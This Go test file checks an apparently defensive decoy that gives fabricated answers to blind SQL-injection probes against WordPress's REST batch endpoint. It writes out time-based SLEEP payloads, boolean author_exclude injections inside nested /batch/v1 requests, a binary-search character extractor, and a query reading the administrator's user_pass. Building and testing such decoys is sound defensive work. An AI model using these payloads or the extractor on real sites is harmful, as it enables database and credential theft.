package plugins

import (
	"hash/crc32"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// This file is the correctness proof for Task 3 (route the fiction-DB into
// the timing/boolean oracle): a small in-test harness plays the role of the
// exploit's blind-SQLi extractor (poc.py's getscalar/getint) — issue a
// length-probe predicate, binary-search it, then issue per-char ASCII probes
// and binary-search each byte — driven entirely THROUGH the shipped
// MirrorDelayMs/MirrorRespond plumbing (never calling recognizeBlindRead or
// evalBlindPredicate directly). If the reconstructed string doesn't come out
// "wp_posts", the wiring is broken somewhere between the regex extraction and
// the fiction DB, not just the fiction DB itself.
// ---------------------------------------------------------------------------

// tablePrefixSubquery is the table-prefix read intent's scoping subquery
// (INFORMATION_SCHEMA.TABLES + a "RIGHT(...,6)=0x5f706f737473" suffix
// filter — one of the several phrasings recognizeBlindRead's Intent 1
// accepts). Content is opaque to evalBlindPredicate; only recognizeBlindRead
// reads it.
const tablePrefixSubquery = `(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE RIGHT(TABLE_NAME,6)=0x5f706f737473 LIMIT 1)`

// adminIDSubquery is the administrator-id read intent's scoping subquery
// (wp_usermeta capabilities + a LIKE '%administrator%' marker — Intent 2).
const adminIDSubquery = `(SELECT user_id FROM wp_usermeta WHERE meta_key='capabilities' AND meta_value LIKE '%administrator%' LIMIT 1)`

// cacheKeyMD5 is a stand-in md5 hex digest (md5("") — any 32-hex-char string
// works, recognizeBlindRead never hashes it, just uses it as a stable map
// key) scoping the oEmbed-cache read intent (Intent 3).
const cacheKeyMD5 = "d41d8cd98f00b204e9800998ecf8427e"

// cacheSubquery is the oEmbed-cache row-id read intent's scoping subquery,
// expressed as a BARE (SELECT ...) wrapper (exercising the second int-compare
// sub-shape evalBlindPredicate recognizes, distinct from adminIDSubquery's
// COALESCE wrapper below).
const cacheSubquery = `(SELECT ID FROM wp_posts WHERE post_type='oembed_cache' AND post_name='` + cacheKeyMD5 + `')`

// ifSleepFrag builds the exact "SELECT IF(<cond>,SLEEP(<n>),0)" batch
// sub-request fragment the exploit's timing oracle sends, URL-encoded exactly
// as it would appear on the wire (the "single-paren" convention: cond is NOT
// additionally wrapped, unlike the "double-paren" 0)-AND-style calibration
// fixtures elsewhere in this package — this is the shape a hand-rolled
// IF(<cond>,SLEEP(n),0) time-based payload actually takes). n is fixed small
// (2) since MirrorDelayMs only computes the implied delay — it never
// actually sleeps in-test (time.Sleep lives at the HTTP call site, untouched
// here).
func ifSleepFrag(cond string, n int) string {
	return url.QueryEscape("SELECT IF(" + cond + ",SLEEP(" + strconv.Itoa(n) + "),0)")
}

// binarySearchGE returns the largest v in [lo,hi] for which oracle(v) is
// true, assuming oracle is monotonically non-increasing over the range (true
// for every v <= the hidden target, false above it) — exactly the shape a
// ">=" comparison oracle produces. Standard integer binary search, O(log n)
// oracle calls.
func binarySearchGE(oracle func(threshold int) bool, lo, hi int) int {
	for lo < hi {
		mid := lo + (hi-lo+1)/2
		if oracle(mid) {
			lo = mid
		} else {
			hi = mid - 1
		}
	}
	return lo
}

// mirrorDelayOracle returns a boolean oracle function that plays the
// exploit's role: build SELECT IF(<condFmt(threshold)>,SLEEP(2),0), send it
// through MirrorDelayMs (with sess armed) via the exact shipped
// timingMirror() config, and report whether a delay came back. This is the
// same call the HTTP strategy makes (modulo the actual time.Sleep, which
// lives at that call site, not here).
func mirrorDelayOracle(t *testing.T, sess *chainSession, condFmt func(threshold int) string) func(threshold int) bool {
	t.Helper()
	m := timingMirror() // shipped IfRegex/BareRegex config, reused verbatim
	return func(threshold int) bool {
		frag := ifSleepFrag(condFmt(threshold), 2)
		body := sleepBody(frag)
		return MirrorDelayMs(m, []byte(body), sess) > 0
	}
}

// recoverStringViaTiming reconstructs a string entirely through the timing
// oracle: binary-search CHAR_LENGTH(...) >= N for the length, then
// binary-search ASCII(SUBSTRING(...,pos,1)) >= M for each byte in turn. This
// mirrors poc.py's getscalar() length-then-bytes strategy.
func recoverStringViaTiming(t *testing.T, sess *chainSession, subquery string, maxLen int) string {
	t.Helper()

	lenOracle := mirrorDelayOracle(t, sess, func(threshold int) string {
		return "CHAR_LENGTH(COALESCE(" + subquery + ",''))>=" + strconv.Itoa(threshold)
	})
	length := binarySearchGE(lenOracle, 0, maxLen)

	var sb strings.Builder
	for pos := 1; pos <= length; pos++ {
		p := pos
		byteOracle := mirrorDelayOracle(t, sess, func(threshold int) string {
			return "ASCII(SUBSTRING(" + subquery + "," + strconv.Itoa(p) + ",1))>=" + strconv.Itoa(threshold)
		})
		b := binarySearchGE(byteOracle, 0, 255)
		sb.WriteByte(byte(b))
	}
	return sb.String()
}

// TestFictionOracle_BinarySearch_RecoversTablePrefix is the flagship
// correctness proof: an in-test binary-search extractor, talking to nothing
// but MirrorDelayMs, must reconstruct the fabricated table prefix
// byte-for-byte.
func TestFictionOracle_BinarySearch_RecoversTablePrefix(t *testing.T) {
	sess := newChainSession()
	got := recoverStringViaTiming(t, sess, tablePrefixSubquery, 32)
	if got != "wp_posts" {
		t.Fatalf("binary-search reconstruction = %q, want %q", got, "wp_posts")
	}
}

// TestFictionOracle_BinarySearch_RecoversAdminID recovers the fabricated
// administrator id (1) via a getint-shape COALESCE(...,0)>=N binary search
// through the same timing oracle.
func TestFictionOracle_BinarySearch_RecoversAdminID(t *testing.T) {
	sess := newChainSession()
	m := timingMirror()
	oracle := func(threshold int) bool {
		cond := "COALESCE(" + adminIDSubquery + ",0)>=" + strconv.Itoa(threshold)
		frag := ifSleepFrag(cond, 2)
		body := sleepBody(frag)
		return MirrorDelayMs(m, []byte(body), sess) > 0
	}
	got := binarySearchGE(oracle, 0, 100)
	if got != 1 {
		t.Fatalf("recovered admin id = %d, want 1", got)
	}
}

// TestFictionOracle_BinarySearch_RecoversCacheID recovers a fabricated
// oEmbed-cache row id via a getint-shape bare-(SELECT ...)>=N binary search
// (the OTHER int-compare sub-shape, distinct from AdminID's COALESCE
// wrapper), and cross-checks it against the same deterministic
// crc32(key)-derived formula fictiondb.go uses, proving the value isn't
// merely "some number that happened to satisfy the last probe" but the
// SPECIFIC id the fiction DB assigned to this object.
func TestFictionOracle_BinarySearch_RecoversCacheID(t *testing.T) {
	sess := newChainSession()
	m := timingMirror()
	oracle := func(threshold int) bool {
		cond := cacheSubquery + ">=" + strconv.Itoa(threshold)
		frag := ifSleepFrag(cond, 2)
		body := sleepBody(frag)
		return MirrorDelayMs(m, []byte(body), sess) > 0
	}
	got := binarySearchGE(oracle, 0, 1200)

	want := 100 + int64(crc32.ChecksumIEEE([]byte(cacheKeyMD5))%900)
	if int64(got) != want {
		t.Fatalf("recovered cache id = %d, want %d (crc32-derived)", got, want)
	}

	// Distinctness: a DIFFERENT cache object (different md5) must resolve to
	// a value that is at least independently derived (not a hardcoded
	// constant) — recompute via a second key and confirm the formula, not
	// just re-observe the same number.
	const otherMD5 = "5d41402abc4b2a76b9719d911017c592" // md5("hello")
	otherSubquery := `(SELECT ID FROM wp_posts WHERE post_type='oembed_cache' AND post_name='` + otherMD5 + `')`
	otherOracle := func(threshold int) bool {
		cond := otherSubquery + ">=" + strconv.Itoa(threshold)
		frag := ifSleepFrag(cond, 2)
		body := sleepBody(frag)
		return MirrorDelayMs(m, []byte(body), sess) > 0
	}
	gotOther := binarySearchGE(otherOracle, 0, 1200)
	wantOther := 100 + int64(crc32.ChecksumIEEE([]byte(otherMD5))%900)
	if int64(gotOther) != wantOther {
		t.Fatalf("recovered second cache id = %d, want %d (crc32-derived)", gotOther, wantOther)
	}

	// Repeat-read stability: probing the FIRST object again (same session)
	// must resolve to the same id as before, not drift.
	gotAgain := binarySearchGE(oracle, 0, 1200)
	if gotAgain != got {
		t.Fatalf("cache id drifted across repeat reads: first=%d second=%d", got, gotAgain)
	}
}

// TestFictionOracle_CalibrationUnchanged pins that literal-constant
// calibration probes (SELECT IF((1=1),SLEEP(n),0) / (1=0)) are decided by
// evalLiteralBool exactly as before, EVEN WITH a non-nil sess armed — the
// isLit branch must short-circuit before the fiction fallback ever runs.
func TestFictionOracle_CalibrationUnchanged(t *testing.T) {
	sess := newChainSession()
	m := timingMirror()

	trueBody := sleepBody(`SELECT+IF%28%281%3D1%29%2CSLEEP%282%29%2C0%29`)
	if got := MirrorDelayMs(m, []byte(trueBody), sess); got != 2000 {
		t.Fatalf("calibration (1=1) with sess armed: got %d, want 2000", got)
	}
	falseBody := sleepBody(`SELECT+IF%28%281%3D0%29%2CSLEEP%282%29%2C0%29`)
	if got := MirrorDelayMs(m, []byte(falseBody), sess); got != 0 {
		t.Fatalf("calibration (1=0) with sess armed: got %d, want 0", got)
	}
}

// TestFictionOracle_FailClosed proves the fiction fallback fails CLOSED (zero
// delay, no fabricated answer) for reads recognizeBlindRead must never
// answer: a credential-column read (hard denylist, even though it superficially
// shares Intent 2's usermeta/capabilities co-occurrence) and an
// unrecognized-shape read (@@version) that matches none of the three intents.
func TestFictionOracle_FailClosed(t *testing.T) {
	sess := newChainSession()
	m := timingMirror()

	cases := []struct {
		name string
		cond string
	}{
		{
			"credential column denylist",
			// Same usermeta/capabilities/administrator co-occurrence as the
			// legitimate admin-id read, but reading user_pass instead of
			// user_id — must fail closed regardless.
			"ASCII(SUBSTRING((SELECT user_pass FROM wp_users WHERE ID=(SELECT user_id FROM wp_usermeta WHERE meta_key='capabilities' AND meta_value LIKE '%administrator%' LIMIT 1)),1,1))>=64",
		},
		{
			"unrecognized shape (@@version)",
			"ASCII(SUBSTRING((SELECT @@version),1,1))>=52",
		},
	}
	for _, c := range cases {
		frag := ifSleepFrag(c.cond, 5)
		body := sleepBody(frag)
		if got := MirrorDelayMs(m, []byte(body), sess); got != 0 {
			t.Errorf("%s: got delay %d, want 0 (fail closed)", c.name, got)
		}
	}
}

// TestFictionOracle_NilSess_ZeroRegression proves the zero-regression
// guarantee directly: the EXACT SAME recognized blind-read predicate that
// TestFictionOracle_BinarySearch_RecoversAdminID resolves to a real
// differential with sess armed produces FLAT ZERO delay with sess == nil —
// i.e. the fiction fallback never fires unless a session is explicitly
// threaded in, which today (Task 3) is never, from http.go or any Layer-1
// test call site.
func TestFictionOracle_NilSess_ZeroRegression(t *testing.T) {
	m := timingMirror()
	cond := "COALESCE(" + adminIDSubquery + ",0)>=1"
	frag := ifSleepFrag(cond, 5)
	body := sleepBody(frag)
	if got := MirrorDelayMs(m, []byte(body), nil); got != 0 {
		t.Fatalf("nil sess must yield 0 delay for a fiction-only predicate, got %d", got)
	}
}

// TestFictionOracle_BooleanContent_PresentAbsent exercises the OTHER half of
// the fallback (forgeElement's boolean-content path, not the timing path):
// a recognized blind-read predicate wrapped in the "<n>) AND|OR <cond> -- -"
// author_exclude shape must serve X-WP-Total:1/present when the fabricated
// admin id satisfies the predicate and X-WP-Total:0/absent when it does not.
func TestFictionOracle_BooleanContent_PresentAbsent(t *testing.T) {
	sess := newChainSession()
	cfg := forgeOnlyMirror()

	boolBody := func(cond string) string {
		frag := url.QueryEscape("0) AND (" + cond + ") -- -")
		return `{"requests": [{"method": "POST", "path": "///"}, {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": [{"method": "POST", "path": "///"}, {"method": "GET", "path": "/wp/v2/users?author_exclude=` + frag + `"}, {"method": "GET", "path": "/wp/v2/posts"}]}}, {"method": "POST", "path": "/batch/v1", "body": {"requests": []}}]}`
	}

	trueCond := "COALESCE(" + adminIDSubquery + ",0)=1" // fabricated admin id IS 1 -> true
	_, bodyTrue, okT := MirrorRespond(cfg, []byte(boolBody(trueCond)), sess)
	if !okT {
		t.Fatal("MirrorRespond (fiction-true) returned ok=false")
	}
	if !strings.Contains(bodyTrue, `"X-WP-Total":1`) {
		t.Fatalf("expected X-WP-Total:1 for a true fiction predicate, got: %s", bodyTrue)
	}

	falseCond := "COALESCE(" + adminIDSubquery + ",0)=999" // fabricated admin id is NOT 999 -> false
	_, bodyFalse, okF := MirrorRespond(cfg, []byte(boolBody(falseCond)), sess)
	if !okF {
		t.Fatal("MirrorRespond (fiction-false) returned ok=false")
	}
	if !strings.Contains(bodyFalse, `"X-WP-Total":0`) {
		t.Fatalf("expected X-WP-Total:0 for a false fiction predicate, got: %s", bodyFalse)
	}

	// nil sess: the identical true-shaped predicate must fall through to
	// booleanElement's own fail-closed behavior (non-literal -> declines,
	// caller falls through to the plain static/default rule, not a forged
	// present/absent element at all).
	_, bodyNilSess, okNil := MirrorRespond(cfg, []byte(boolBody(trueCond)), nil)
	if !okNil {
		t.Fatal("MirrorRespond (nil sess) returned ok=false")
	}
	if strings.Contains(bodyNilSess, `X-WP-Total`) {
		t.Fatalf("nil sess must not forge a boolean element for a non-literal condition, got: %s", bodyNilSess)
	}
}
